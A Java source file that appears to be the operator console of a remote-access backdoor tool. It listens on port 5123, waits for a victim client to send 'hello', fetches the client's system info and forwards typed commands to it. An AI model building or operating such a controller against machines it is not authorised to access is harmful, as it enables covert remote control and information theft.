package launcher;

import java.io.IOException;
import java.util.Scanner;

import commands.CommandManager;
import connection.Connection;
import connection.Server;

public class Main {

	public static void main(String[] args) throws IOException {
		int _port = 5123;
		Server server = new Server(_port);
		Scanner in = new Scanner(System.in);
		Connection mainConnection;
		String firstContact;
		
		System.out.println(asciiArt());
		
		while(true) {
			System.out.println("Waiting for connection on port " + _port + "...");
			do {
				mainConnection = server.connect();
				firstContact = mainConnection.receive();
			}while(!firstContact.equals("hello"));
			System.out.println("Connected");
			System.out.println("Retrieving system info...");
			System.out.println(mainConnection.getSysInfo());
				
			while(mainConnection.connectionIsOpen()) {
				try {
					System.out.print("\n\n> ");
					String command = in.nextLine();
					CommandManager.parseCommand(command, mainConnection, server);
				}catch(IOException | InterruptedException e){
					mainConnection.end();
					System.out.println("\nConnection interrupted :/ \n");
				}
			}
		}
	}
	
	private static String asciiArt() {
		String ascii = "\n";
		
		ascii += "   /|\n";
		ascii += "  / |\n";
		ascii += " /__|______\n";
		ascii += "|  __  __  |\n";
		ascii += "| |  ||  | |\n";
		ascii += "| |__||__| |\n";
		ascii += "|  __  __()|\n"; 
		ascii += "| |  ||  | | If it's already open... \n";
		ascii += "| |  ||  | |\n";
		ascii += "| |__||__| |  GitHub: @hacefresko \n";
		ascii += "|__________|\n";
	
		return ascii;
	}
}
